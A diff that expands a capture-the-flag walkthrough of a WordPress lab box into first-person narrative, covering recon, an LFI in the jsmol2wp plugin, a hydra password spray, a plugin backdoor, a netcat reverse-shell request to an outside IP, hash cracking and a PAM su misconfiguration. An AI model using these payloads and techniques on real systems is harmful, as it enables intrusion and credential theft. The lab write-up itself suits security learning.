@@ -48,6 +48,8 @@ tags:
 
 ### Nmap scan
 
+I began, as usual, with a full TCP port scan against the box to see what surface I had to work with before touching anything by hand:
+
 ```bash
 Host is up, received user-set (0.087s latency).
 Scanned at 2025-05-20 21:46:36 EDT for 21s
@@ -70,6 +72,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### Getting redirect doamin
 
+The web server on port `80` immediately redirected everything to a virtual host name rather than serving content directly, so I confirmed that behaviour with a raw curl request before touching `/etc/hosts`:
+
 ```bash
 └─[$] curl -vv 10.10.61.192                                                                                        [21:45:10]
 *   Trying 10.10.61.192:80...
@@ -90,6 +94,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### Locating Parameter
 
+With `www.smol.thm` added to my hosts file and the domain resolving properly, I ran arjun against the homepage to check for hidden GET parameters, since WordPress sites sometimes wire up debug or utility parameters that never surface in the rendered HTML:
+
 ```bash
 └─[$] arjun -u http://www.smol.thm/ --stable                                                                       [21:48:37]
     _
@@ -109,12 +115,16 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ### Enumerating Application Basic Level
 
+That came back empty, so I moved on to more conventional technology fingerprinting instead and ran whatweb against the site to get a quick read on the stack before doing anything more invasive:
+
 ```bash
 whatweb http://www.smol.thm/                                                                                 [21:47:13]
 http://www.smol.thm/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[admin@smol.thm], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.61.192], JQuery[3.7.1], MetaGenerator[WordPress 6.7.1], Script[importmap,module], Title[AnotherCTF], UncommonHeaders[link], WordPress[6.7.1]
 ```
 
 #### Running Web Technologies
+
+That confirmed the stack I would be dealing with:
 
 ```bash
 WordPress[6.7.1]
@@ -125,6 +135,8 @@ MetaGenerator[WordPress 6.7.1]
 
 #### Interesting Finds
 
+whatweb also picked up a contact email address, which I filed away for later since it is exactly the kind of detail that turns useful during a password spray or a social engineering angle:
+
 ```bash
 EMAILS --------------
 admin@smol.thm
@@ -133,6 +145,8 @@ admin@smol.thm
 ### Wpscan Enumeration
 
 #### Enumerating Users
+
+With WordPress confirmed, wpscan was the obvious next tool, and I started with user enumeration to build a target list for a password attack later on:
 
 ```bash
 [+] Enumerating Users (via Passive and Aggressive Methods)
@@ -183,6 +197,8 @@ admin@smol.thm
 
 #### Active Plugins
 
+I also had wpscan enumerate the active plugins, since an outdated or unusual plugin is very often the actual way into a WordPress box rather than core itself:
+
 ```bash
 [+] jsmol2wp
  | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
@@ -200,6 +216,8 @@ admin@smol.thm
 
 
 ### Nuclei Enumeration
+
+I ran nuclei's web templates against the site as well, to catch anything wpscan's WordPress-specific checks might have missed, and two findings immediately stood out against the informational noise:
 
 ```bash
 [CVE-2018-20462] [http] [medium] http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mimetype=text/html;%20charset=utf-8
@@ -236,6 +254,8 @@ admin@smol.thm
 
 #### Found CVES
 
+Filtering nuclei's output down to just the CVE-tagged findings made the priority obvious:
+
 ```json
 [CVE-2018-20462] [http] [medium] http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&mimetype=text/html;%20charset=utf-8
 [CVE-2018-20463] [http] [high] http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
@@ -246,7 +266,7 @@ admin@smol.thm
 
 ### Exploiting `CVE-2018-20643` LFI
 
-Visiting the url `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php` shows some credentials I then found a password `kbLSF2Vop#lw3rjDZ629*Z%G` which I could attempt to use for a bruteforce.
+Visiting `http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php` directly, using the `php://filter` wrapper nuclei had already flagged for me, dumped the raw source of `wp-config.php` straight into the response. Reading through it turned up the WordPress database password `kbLSF2Vop#lw3rjDZ629*Z%G` in plaintext, which gave me a real credential I could try reusing against the login form itself.
 
 ```php
 <?php
@@ -348,15 +368,17 @@ require_once ABSPATH . 'wp-settings.php';
 
 ### Bruteforcing with `hydra`
 
+With a real password in hand but no confirmed username to pair it with, I turned to hydra to spray that single password across every username wpscan had surfaced, on the theory that the credential might have been reused for one of the actual WordPress accounts:
+
 ```bash
 hydra -L users.lst  -p 'kbLSF2Vop#lw3rjDZ629*Z%G' -f www.smol.thm http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fwww.smol.thm%2Fwp-admin%2F&testcookie=1:The password you entered for the email" -t 1 -I -V
 ```
 
 ![Pasted image 20250520221033](Pasted-image-20250520221033.png)
 
-Now we can login to the website!
+That paid off: one of the accounts accepted the password, and I was able to log straight into the WordPress admin area.
 
-after logging in I find a webpage with the following.
+Once inside, I found a page laying out the site's own list of outstanding security recommendations, which read almost like an admission of exactly where the vulnerabilities were hiding.
 
 ```bash
 1- [IMPORTANT] Check Backdoors: Verify the SOURCE CODE of "Hello Dolly" plugin as the site's code revision.
@@ -384,6 +406,8 @@ after logging in I find a webpage with the following.
 
 
 #### Passwd file
+
+While I was looking at what else might be reachable, I used that same LFI primitive again, this time pointed at `/etc/passwd`, which gave me a full picture of every local account on the box to cross-reference against the WordPress usernames I already had:
 
 ```bash
 root:x:0:0:root:/root:/usr/bin/bash
@@ -432,7 +456,7 @@ gege:x:1003:1003::/home/gege:/bin/bash
 
 https://wpscan.com/vulnerability/5a7c6367-a3e6-4411-8865-2a9dbc9f1450/
 
-This shows an example of what is vulnerable and the cve which is `CVE-2022-3677` For the longest of time I tried to exploit this vulnerability in many ways no success but I remembered I have `LFI`  so I took at look into `/wp-content/plugins/hellp.php` and I found a base64 encoded string which in a nutshell is that backdoor that was being spoken about.
+That page detailed the exact vulnerability, tracked as `CVE-2022-3677`, and for a good while I tried to exploit it directly with no success at all. Then I remembered I already had a working LFI, so instead of continuing to fight the CVE head-on, I used it to look directly at `/wp-content/plugins/hellp.php`, where I found a base64-encoded string that turned out to be exactly the backdoor the security recommendations page had been warning about.
 
 ```php
 <?php
@@ -542,7 +566,7 @@ add_action( 'admin_head', 'dolly_css' )
 
 ![Pasted image 20250520231655](Pasted-image-20250520231655.png)
 
-From there I used the following request to gain `RCE`
+With the backdoor's decoded payload confirmed as a raw `system()` call gated behind two GET parameters, building a request to get code execution was straightforward.
 
 ```http
 GET /wp-admin/upload.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|bash+-i+2>%261|nc+10.21.23.235+9001+>/tmp/f HTTP/1.1
@@ -559,7 +583,7 @@ Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 ```
 
-From there I logged into the `wp database` with the found credentials and dummped the users. From there I am going to attempt to crack the user hashes found on the system that are also registered on the wordpress website.
+With code execution established, I used it to pivot into the WordPress database directly with the credentials I had already recovered from `wp-config.php`, and dumped the `wp_users` table. My plan from there was to try cracking those password hashes, since any user who reused their WordPress password for their actual system account would hand me SSH access outright.
 
 ```bash
 $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
@@ -583,15 +607,17 @@ $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
 6 rows in set (0.00 sec)
 ```
 
-I tried cracking them normally with `hashcat` got nothing. I am going to now attempt with `john` the OG himself used to be my primary tool for cracking hashes but our relationship has been complicated.
+Running the hashes through hashcat first got me nowhere, so I switched to john instead, a tool I have a genuinely mixed history with but still reach for whenever hashcat stalls out on an older or less common hash format.
 
 #### Cracking with `john the GOAT`
 
 ![Pasted image 20250520234427](Pasted-image-20250520234427.png)
 
-now we can login to diego! 
+That run actually paid off: one of the hashes cracked, and it gave me SSH access as diego.
 
 #### Interesting findings through `linpeas` from `diego`
+
+With a proper shell as diego, I ran linpeas to look for privilege escalation angles, and a handful of entries in the output were worth following up on:
 
 ```bash
 ╔══════════╣ Backup files (limited 100)
@@ -678,6 +704,8 @@ port 33060 another database?
 
 #### Metasploit Exploit Suggester
 
+I also ran the box through Metasploit's local exploit suggester as a second opinion, since kernel and sudo version-based privilege escalation bugs are easy to overlook by eye alone:
+
 ```bash
  #   Name                                                                Potentially Vulnerable?  Check Result
  -   ----                                                                -----------------------  ------------
@@ -693,6 +721,8 @@ port 33060 another database?
 
 
 ### Getting user `gege`
+
+One of the files linpeas surfaced was `/etc/pam.d/su`, and reading through its authentication rules by hand turned up something unusual enough that I wanted to verify it myself rather than trust a scanner's summary:
 
 ```bash
 think@smol:~$ cat /etc/pam.d/su
@@ -762,15 +792,17 @@ think@smol:~$ su gege
 gege@smol:/home/think$ 
 ```
 
-the `pam` configuration allows us to login to this user without password.
+Looking at the actual PAM stack, that `pam_succeed_if.so` line effectively lets the `think` user `su` into `gege` with no password check at all, a misconfiguration I don't run into often outside of intentionally vulnerable boxes, and it was enough to hand me a shell as `gege` directly.
 
 ![Pasted image 20250521002956](Pasted-image-20250521002956.png)
 
-we need a password
+`gege`'s home directory turned out to hold something else worth chasing, a password-protected zip archive, but actually opening it meant recovering its password first.
 
 ![Pasted image 20250521003109](Pasted-image-20250521003109.png)
 
 ![Pasted image 20250521003124](Pasted-image-20250521003124.png)
+
+I extracted the zip's hash and set john loose on it against rockyou:
 
 ```bash
 └─[$] john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ./ziphash                           [0:30:44]
@@ -784,7 +816,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 
-I found credentials for the user `xavi` in the `wp-config.php`
+Unzipping the archive with the cracked password turned up an old copy of `wp-config.php`, and inside it were database credentials for a different account, `xavi`, credentials that immediately looked worth reusing given how this box had already reused a WordPress password once before.
 
 ```php
 /** Database username */
